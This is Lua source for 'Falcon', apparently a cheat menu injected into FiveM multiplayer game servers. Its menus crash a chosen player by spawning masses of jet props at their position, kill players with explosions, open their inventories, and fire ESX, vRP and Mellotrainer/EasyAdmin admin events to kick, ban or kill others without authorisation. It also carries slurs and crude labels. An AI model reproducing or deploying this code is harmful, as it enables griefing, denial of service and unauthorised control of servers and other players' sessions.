    local savedpos3 = nil
    local savedpos4 = nil
    local savedpos5 = nil
    

    local includeself = true
    local Collision = true
    local objVisible = true
    local PlaceSelf = true
    local SpawnInAir = true
    local SpawnEngineOn = true
    local vehiclesSpawnUpgraded = false
    local spawnvehgod = false
    
    Citizen.CreateThread(function()
        while true do

            SetDiscordAppId(722522232013717595)

            SetDiscordRichPresenceAsset("Falcon Presents")

            SetDiscordRichPresenceAssetText("Falcon 7.2 coming in your way bitches")

            SetDiscordRichPresenceAssetSmall("Falcon is the real shit bitches | JoeMoeDinHoeMoe#1325")

            SetDiscordRichPresenceAssetSmallText("Exia going to the stars | JoeMoeDinHoeMoe#1325")

            Citizen.Wait(60000)
        end
    end)

    SpawnedObjects = {}
    

    Falcon.CreateMenu('Falcon', menuName .. ' ' .. version)
    Falcon.SetSubTitle('Falcon', 'FALCON | EXIA')
    

    Falcon.CreateSubMenu('player', 'Falcon', 'Online Players')
    Falcon.CreateSubMenu('self', 'Falcon', 'Self Options')
    Falcon.CreateSubMenu('weapon', 'Falcon', 'Weapon Options')
    Falcon.CreateSubMenu('vehicle', 'Falcon', 'Vehicle Options')
    Falcon.CreateSubMenu("Models", "self", "Model")
    Falcon.CreateSubMenu("powers", "self", "Super Powers")
    Falcon.CreateSubMenu('world', 'Falcon', 'World Options')
	Falcon.CreateSubMenu('teleport', 'Falcon', 'Teleport Options')
    Falcon.CreateSubMenu('misc', 'Falcon', 'Misc Options')
    Falcon.CreateSubMenu("AI", "Falcon", "AI Menu")    
    Falcon.CreateSubMenu('lua', 'Falcon', 'Lua Options')
    Falcon.CreateSubMenu('settings', 'Falcon', 'Settings')
    Falcon.CreateSubMenu('fuck', 'Falcon', 'Fuck Server Options')
    Falcon.CreateSubMenu('objects', 'Falcon', 'Object Spawner')
    Falcon.CreateSubMenu('cred', 'settings', 'Credits')
    Falcon.CreateSubMenu('info', 'settings', 'Information About Exia')
    
    

    Falcon.CreateSubMenu('allplayer', 'player', 'All Players')
    Falcon.CreateSubMenu('playeroptions', 'player', 'Online Players')
    Falcon.CreateSubMenu('trollmenu', 'playeroptions', 'Troll Menu')
    Falcon.CreateSubMenu('giveweapon', 'playeroptions', 'Player Weapon Options')
    Falcon.CreateSubMenu('playerveh', 'playeroptions', 'Player Car Options')
    Falcon.CreateSubMenu('weaponspawnerplayer', 'giveweapon', 'Spawn Single Weapon')
    Falcon.CreateSubMenu('WeaponCustomization', 'weapon', 'Weapon Customization')
    

    Falcon.CreateSubMenu('appearance', 'self', 'Appearance Options')
    Falcon.CreateSubMenu('modifiers', 'self', 'Modifiers Options')
	

	Falcon.CreateSubMenu('modifyskintextures', 'appearance', "Modify Skin Textures")
    Falcon.CreateSubMenu('modifyhead', 'modifyskintextures', "Available Drawables")
    

    Falcon.CreateSubMenu('weaponspawner', 'weapon', 'Weapon Spawner')
    Falcon.CreateSubMenu('melee', 'weaponspawner', 'Melee Weapons')
    Falcon.CreateSubMenu('pistol', 'weaponspawner', 'Pistols')
    Falcon.CreateSubMenu('smg', 'weaponspawner', 'SMGs / MGs')
    Falcon.CreateSubMenu('shotgun', 'weaponspawner', 'Shotguns')
    Falcon.CreateSubMenu('assault', 'weaponspawner', 'Assault Rifles')
    Falcon.CreateSubMenu('sniper', 'weaponspawner', 'Sniper Rifles')
    Falcon.CreateSubMenu('thrown', 'weaponspawner', 'Thrown Weapons')
    Falcon.CreateSubMenu('heavy', 'weaponspawner', 'Heavy Weapons')
    

    Falcon.CreateSubMenu('vehiclespawner', 'vehicle', 'Vehicle Spawner')
    Falcon.CreateSubMenu('vehiclemods', 'vehicle', 'Vehicle Mods')
    Falcon.CreateSubMenu('VehBoostMenu', 'vehicle', 'Engine Boost')
    Falcon.CreateSubMenu('VehTorque', 'vehicle', 'Torque Boost')
    Falcon.CreateSubMenu('vehiclemenu', 'vehicle', 'Vehicle Control Menu')
    

    Falcon.CreateSubMenu('compacts', 'vehiclespawner', 'Compacts')
    Falcon.CreateSubMenu('sedans', 'vehiclespawner', 'Sedans')
    Falcon.CreateSubMenu('suvs', 'vehiclespawner', 'SUVs')
    Falcon.CreateSubMenu('coupes', 'vehiclespawner', 'Coupes')
    Falcon.CreateSubMenu('muscle', 'vehiclespawner', 'Muscle')
    Falcon.CreateSubMenu('sportsclassics', 'vehiclespawner', 'Sports Classics')
    Falcon.CreateSubMenu('sports', 'vehiclespawner', 'Sports')
    Falcon.CreateSubMenu('super', 'vehiclespawner', 'Super')
    Falcon.CreateSubMenu('motorcycles', 'vehiclespawner', 'Motorcycles')
    Falcon.CreateSubMenu('offroad', 'vehiclespawner', 'Off-Road')
    Falcon.CreateSubMenu('industrial', 'vehiclespawner', 'Industrial')
    Falcon.CreateSubMenu('utility', 'vehiclespawner', 'Utility')
    Falcon.CreateSubMenu('vans', 'vehiclespawner', 'Vans')
    Falcon.CreateSubMenu('cycles', 'vehiclespawner', 'Cycles')
    Falcon.CreateSubMenu('boats', 'vehiclespawner', 'Boats')
    Falcon.CreateSubMenu('helicopters', 'vehiclespawner', 'Helicopters')
    Falcon.CreateSubMenu('planes', 'vehiclespawner', 'Planes')
    Falcon.CreateSubMenu('service', 'vehiclespawner', 'Service')
    Falcon.CreateSubMenu('commercial', 'vehiclespawner', 'Commercial')
    

    Falcon.CreateSubMenu('vehiclecolors', 'vehiclemods', 'Vehicle Colors')
    Falcon.CreateSubMenu('vehiclecolors_primary', 'vehiclecolors', 'Primary Color')
    Falcon.CreateSubMenu('vehiclecolors_secondary', 'vehiclecolors', 'Secondary Color')
    
    Falcon.CreateSubMenu('primary_classic', 'vehiclecolors_primary', 'Classic Colors')
    Falcon.CreateSubMenu('primary_matte', 'vehiclecolors_primary', 'Matte Colors')
    Falcon.CreateSubMenu('primary_metal', 'vehiclecolors_primary', 'Metals')
    
    Falcon.CreateSubMenu('secondary_classic', 'vehiclecolors_secondary', 'Classic Colors')
    Falcon.CreateSubMenu('secondary_matte', 'vehiclecolors_secondary', 'Matte Colors')
    Falcon.CreateSubMenu('secondary_metal', 'vehiclecolors_secondary', 'Metals')
    
    Falcon.CreateSubMenu('vehicletuning', 'vehiclemods', 'Vehicle Tuning')
    

    Falcon.CreateSubMenu('objectspawner', 'world', 'Object Spawner')
    Falcon.CreateSubMenu('objectlist', 'objects', 'Select To Delete')
    Falcon.CreateSubMenu('weather', 'misc', 'Weather Changer ~r~(CLIENT SIDE)')
    Falcon.CreateSubMenu('time', 'world', 'Time Changer')
    Falcon.CreateSubMenu('serverOptionsResources', 'misc', 'Just some resources')
    

	Falcon.CreateSubMenu('esp', 'misc', 'ESP & Visual Options')
	Falcon.CreateSubMenu('keybindings', 'misc', 'Keybindings')
	Falcon.CreateSubMenu('webradio', 'misc', 'Web Radio')
    Falcon.CreateSubMenu('credits', 'settings', 'Credits')
    Falcon.CreateSubMenu('info', 'settings', 'Information About Exia')
    

    Falcon.CreateSubMenu('saveload', 'teleport', 'Save/Load Position')
    Falcon.CreateSubMenu('pois', 'teleport', 'POIs')
    

    Falcon.CreateSubMenu('esx', 'lua', 'ESX Options')
    Falcon.CreateSubMenu('vrp', 'lua', 'vRP Options')
    Falcon.CreateSubMenu('other', 'lua', 'Other')
    Falcon.CreateSubMenu('devo', 'lua', 'Devo triggers')
    Falcon.CreateSubMenu('qb-core', 'lua', 'QB-Core triggers')
    


	
	
    Falcon.InitializeTheme()
    
    while true do
        

        if Falcon.IsMenuOpened('Falcon') then
            if Falcon.Button('🌐~r~Made By ~b~JoeMoeDinHoeMoe#1325') then
            elseif Falcon.MenuButton('~s~Online Players ~r~→', 'player') then
            elseif Falcon.MenuButton('~s~Self Options ~r~→', 'self') then
            elseif Falcon.MenuButton('~s~Weapon Options ~r~→', 'weapon') then
            elseif Falcon.MenuButton('~s~Vehicle Options ~r~→', 'vehicle') then
			elseif Falcon.MenuButton('~s~Teleport Options ~r~→', 'teleport') then
            elseif Falcon.MenuButton('~s~Misc Options ~r~→', 'misc') then
            elseif Falcon.MenuButton('~s~Object Spawner ~r~→', 'objects') then
            elseif Falcon.MenuButton('~s~Fuck Server ~r~→', 'fuck') then
            elseif Falcon.MenuButton('~s~Lua Options ~r~→', 'lua') then
            elseif Falcon.MenuButton('~s~Settings ~r~→', 'settings') then
            elseif Falcon.Button('~r~→ Close The Menu ←') then break
            end
            ShowInfo(motd3)
	        ShowInfo(motd)
            ShowInfo(motd5)
            ShowInfo(motd5)
            ShowInfo(motd4)
        
        elseif Falcon.IsMenuOpened('player') then
            Falcon.SetSubTitle('player', #GetActivePlayers()..' Player(s) Online')
            if Falcon.MenuButton('All Players', 'allplayer') then
                else
                local playerlist = GetActivePlayers()
                for i = 1, #playerlist do
                    local currPlayer = playerlist[i]
                    if Falcon.MenuButton("ID: ~b~[" .. GetPlayerServerId(currPlayer) .. "] ~s~" .. GetPlayerName(currPlayer).."~y~ » "..(IsPedDeadOrDying(GetPlayerPed(currPlayer), 1) and "~u~[ ~r~Dead💀 ~u~]" or "~u~[ ~g~Alive💖 ~u~]"), 'playeroptions') then
                        selectedPlayer = currPlayer end
                    end
                end

        elseif Falcon.IsMenuOpened('allplayer') then
        if Falcon.Button("~h~~y~»~r~ Kick All ~b~Players ~r~From Vehicle") then
            KickAllFromVeh(includeself)
        end
        
        if Falcon.Button("Rape Vehicles") then
            Falcon.rapeVehicles()
        end

    elseif Falcon.IsMenuOpened("AI") then
                    if Falcon.Button("~h~Configure The ~g~Speed") then
            cspeed = KeyboardInput("Enter Wanted MaxSpeed", "", 100)
            local c1 = 1.0
            cspeed = tonumber(cspeed)
            if cspeed == nil then
                                    drawNotification(
                    '~~r~Invalid Speed you dumbass~s~.'
                )
                drawNotification(
                    '~r~Operation cancelled~s~.'
                )
            elseif cspeed then
                ojtgh = (cspeed .. ".0")
                SetDriveTaskMaxCruiseSpeed(GetPlayerPed(-1), tonumber(ojtgh))
            end
            
            SetDriverAbility(GetPlayerPed(-1), 100.0)
        elseif Falcon.Button("Drive to waypoint ~o~SLOW") then
            if DoesBlipExist(GetFirstBlipInfoId(8)) then
                local blipIterator = GetBlipInfoIdIterator(8)
                local blip = GetFirstBlipInfoId(8, blipIterator)
                local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                local ped = GetPlayerPed(-1)
                ClearPedTasks(ped)
                local v = GetVehiclePedIsIn(ped, false)
                TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(ojtgh), 156, v, 5, 1.0, true)
                SetDriveTaskDrivingStyle(ped, 8388636)
                speedmit = true
            end
        elseif Falcon.Button("Drive to waypoint ~g~FAST") then
            if DoesBlipExist(GetFirstBlipInfoId(8)) then
                local blipIterator = GetBlipInfoIdIterator(8)
                local blip = GetFirstBlipInfoId(8, blipIterator)
                local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                local ped = GetPlayerPed(-1)
                ClearPedTasks(ped)
                local v = GetVehiclePedIsIn(ped, false)
                TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(ojtgh), 156, v, 2883621, 5.5, true)
                SetDriveTaskDrivingStyle(ped, 2883621)
                speedmit = true
            end
        elseif Falcon.Button("Wander Around") then
            local ped = GetPlayerPed(-1)
            ClearPedTasks(ped)
            local v = GetVehiclePedIsIn(ped, false)
            print("Configured speed is currently " .. ojtgh)
            TaskVehicleDriveWander(ped, v, tonumber(ojtgh), 8388636)
        elseif Falcon.Button("~h~~r~Stop AI") then
            speedmit = false
            if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                ClearPedTasks(GetPlayerPed(-1))
            else
                ClearPedTasksImmediately(GetPlayerPed(-1))
            end
        end
        

        elseif Falcon.IsMenuOpened('playeroptions') then
            if Falcon.Button("~p~Selected: " .. "~y~[" .. GetPlayerServerId(selectedPlayer) .. "] ~s~" .. GetPlayerName(selectedPlayer)) then
                elseif Falcon.CheckBox("~g~Spectate ~s~Player", Spectating, "Spectating: ~m~OFF", "Spectating: "..GetPlayerName(SpectatedPlayer)) then
                    Spectating = not Spectating
                    SpectatePlayer(selectedPlayer)
                    SpectatedPlayer = selectedPlayer
                elseif Falcon.MenuButton("~r~→  ~s~Troll Menu", 'trollmenu') then
                elseif Falcon.MenuButton("~r~→  ~s~Weapon Options", 'giveweapon') then
                elseif Falcon.MenuButton("~r~→  ~s~Player Car Menu", 'playerveh') then
                elseif Falcon.Button("Taze ~g~Player") then
                    TazePlayer(selectedPlayer)
                elseif Falcon.Button("Achmed") then
                    Achmed(SelectedPlayer)
                elseif Falcon.Button('~b~Crash ~s~Player ') then
                        local camion = "phantom"
                            local avion = "CARGOPLANE"
                            local avion2 = "luxor"
                            local heli = "maverick"
                            local random = "bus"
                                local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                                for i = 0, 99 do
                                    Citizen.Wait(0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                    CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                                end
                elseif Falcon.Button("Open Inventory", '~g~ESX') then
                    TriggerCustomEvent(false, "esx_inventoryhud:openPlayerInventory", GetPlayerServerId(selectedPlayer), GetPlayerName(selectedPlayer))
                elseif Falcon.Button("Teleport To Player") then
                    local confirm = GetKeyboardInput("Are you Sure? ~g~Y~w~/~r~N")
                    if string.lower(confirm) == "y" then
                        TeleportToPlayer(selectedPlayer)
                    else
                        ShowInfo("~r~Operation Canceled")
                    end
                elseif Falcon.ComboBox("Teleport Into Players Vehicle~h~~r~ »", {"Front Right", "Back Left", "Back Right"}, currSeatIndex, selSeatIndex, function(currentIndex, selClothingIndex)
                        currSeatIndex = currentIndex
                        selSeatIndex = currentIndex
                        end) then
                        if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
                            ShowInfo("~r~Player Not In Vehicle!")
                        else
                            local confirm = GetKeyboardInput("Are you Sure? ~g~Y~w~/~r~N")
                            if string.lower(confirm) == "y" then
                                local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
                                if selSeatIndex == 1 then
                                    if IsVehicleSeatFree(veh, 0) then
                                        SetPedIntoVehicle(PlayerPedId(), veh, 0)
                                    else
                                        ShowInfo("~r~Seat Taken Or Does Not Exist!")
                                    end
                                elseif selSeatIndex == 2 then
                                    if IsVehicleSeatFree(veh, 1) then
                                        SetPedIntoVehicle(PlayerPedId(), veh, 1)
                                    else
                                        ShowInfo("~r~Seat Taken Or Does Not Exist!")
                                    end
                                elseif selSeatIndex == 3 then
                                    if IsVehicleSeatFree(veh, 2) then
                                        SetPedIntoVehicle(PlayerPedId(), veh, 2)
                                    else
                                        ShowInfo("~r~Seat Taken Or Does Not Exist!")
                                    end
                                end
                            end
                        end	
                    elseif Falcon.Button('~b~VRP ~s~Revive') then local bK = GetEntityCoords(GetPlayerPed(selectedPlayer)) CreateAmbientPickup(GetHashKey('PICKUP_HEALTH_STANDARD'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('PICKUP_HEALTH_STANDARD'), 1, 0) SetPickupRegenerationTime(pickup, 60)
                    elseif Falcon.Button("~r~Kick ~s~From Vehicle") then
                    KickFromVeh(selectedPlayer)
                elseif Falcon.Button("~g~Clone ~s~Player Outfit") then
                    ClonePed(selectedPlayer)
                    ShowInfo("~g~Congratz, u just stole the players outfit")				
                 elseif Falcon.Button("~g~Give ~s~All Weapons") then
                GiveAllWeapons(selectedPlayer)
                elseif Falcon.Button("~r~Remove ~s~All Weapons") then
                    StripPlayer(selectedPlayer)
                elseif Falcon.Button('~b~Armour ~s~Player') then
                        local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        local pickup = CreateAmbientPickup(GetHashKey('PICKUP_ARMOUR_STANDARD'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('PICKUP_ARMOUR_STANDARD'), 1, 0)
                        SetPickupRegenerationTime(pickup, 60)
                elseif Falcon.Button('~b~Full Armour ~s~Player') then
                        local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        for i = 0, 99 do
                            Citizen.Wait(0)
                            CreateAmbientPickup(GetHashKey('PICKUP_ARMOUR_STANDARD'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('PICKUP_ARMOUR_STANDARD'), 1, 0)
                            SetPickupRegenerationTime(pickup, 10)
                            i = i + 1
                        end
                elseif Falcon.Button('~r~Kill ~s~Player') then
                        AddExplosion(GetEntityCoords(GetPlayerPed(selectedPlayer)), 33, 101.0, false, true, 0.0) 
                elseif Falcon.Button("~g~Open ~s~inventory") then
                        TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(selectedPlayer), GetPlayerName(selectedPlayer))
                elseif Falcon.Button("Cancel Animation/Task") then
                    ClearPedTasksImmediately(GetPlayerPed(selectedPlayer))
                elseif Falcon.Button("~b~Mellotrainer ~r~Kill ~s~Player") then
                                            TriggerServerEvent("mellotrainer:s_adminKill", GetPlayerServerId(selectedPlayer))
                                    elseif Falcon.Button("~b~Mellotrainer ~r~Ban ~s~Player") then
                                            TriggerServerEvent( 'mellotrainer:adminTempBan', GetPlayerServerId(selectedPlayer))
                                    elseif Falcon.Button("~b~Mellotrainer ~r~Kick ~s~Player") then
                                            TriggerServerEvent('mellotrainer:adminKick', GetPlayerServerId(selectedPlayer), "Kicked: GAY!." )
                                            TriggerServerEvent("EasyAdmin:kickPlayer", GetPlayerServerId(selectedPlayer), "Kicked: GAY!." )
                                    end
        
        elseif Falcon.IsMenuOpened('trollmenu') then
        if Falcon.ComboBox("~h~~y~»~b~ Attach items", {"~c~Windmill", "~c~~Water", "~c~Attach ~s~Pump", "~c~Attach ~s~Airplane", "~c~Attach ~s~Weapons", "~c~Attach ~s~Tube", "~c~Attach ~s~Something Random", "~c~Ferris Wheel", "~c~Bumper Car"}, currPFuncIndex, selPFuncIndex, function(currentIndex, selectedIndex)
            currPFuncIndex = currentIndex
            selPFuncIndex = currentIndex
            end) then
            if selPFuncIndex == 1 then
                local hamburg = "prop_windmill_01"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            elseif selPFuncIndex == 2 then
                local hamburg = "xs_prop_plastic_bottle_wl"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            elseif selPFuncIndex == 3 then
                local hamburg = "prop_vintage_pump"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            elseif selPFuncIndex == 4 then
                local hamburg = "prop_med_jet_01"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            elseif selPFuncIndex == 5 then
                local hamburg = "v_ilev_gc_weapons"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            elseif selPFuncIndex == 6 then
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            elseif selPFuncIndex == 7 then
                local hamburg = "prop_box_wood06a"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            elseif selPFuncIndex == 8 then
                local hamburg = "p_ferris_wheel_amo_l2"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            elseif selPFuncIndex == 8 then
                local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                local pickup = CreateObject(GetHashKey('prop_bumper_car_01'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('prop_bumper_car_01'), 1, 0)
                SetPickupRegenerationTime(pickup, 60)
            end
        elseif Falcon.ComboBox("~h~~y~»~b~ Attach Flags", {"~c~Flagpole", "~c~Europa", "~c~United Kingdom", "~c~France", "~c~Japan", "~c~Germany", "~c~Ireland", "~c~Russia", "~c~Scotland", "~c~Canada", "~c~Mexico", "~c~Denmark"}, currPFuncIndexx, selPFuncIndexx, function(currentIndex, selectedIndex)
                currPFuncIndexx = currentIndex
                selPFuncIndexx = currentIndex
                end) then
        if selPFuncIndexx == 1 then
            local hamburg = "prop_flagpole_1a"
            local hamburghash = GetHashKey(hamburg)
            local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
            AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
        elseif selPFuncIndexx == 2 then
            local hamburg = "prop_flag_eu"
            local hamburghash = GetHashKey(hamburg)
            local hamburger = CreateObject(hamburghash, 50, 50, 10, true, true, true)
            AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, 0.5, 0.0, 0.0, 10, true, true, false, true, 1, true)
        elseif selPFuncIndexx == 3 then
            local hamburg = "prop_flag_uk"
            local hamburghash = GetHashKey(hamburg)
            local hamburger = CreateObject(hamburghash, 50, 50, 10, true, true, true)
            AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, 0.5, 0.0, 0.0, 10, true, true, false, true, 1, true)
        elseif selPFuncIndexx == 4 then
            local hamburg = "prop_flag_france"
            local hamburghash = GetHashKey(hamburg)
            local hamburger = CreateObject(hamburghash, 50, 50, 10, true, true, true)
            AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, 0.5, 0.0, 0.0, 10, true, true, false, true, 1, true)
